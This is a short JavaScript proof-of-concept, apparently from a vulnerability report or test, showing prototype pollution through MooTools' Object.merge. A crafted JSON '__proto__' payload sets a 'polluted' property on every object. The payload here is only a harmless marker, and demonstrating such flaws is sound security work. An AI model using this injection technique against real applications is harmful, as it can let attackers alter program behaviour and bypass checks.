var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
require('mootools');
console.log({}.polluted);
Object.merge(obj, JSON.parse('{"__proto__": {"polluted": "yes"}}'));
console.log({}.polluted);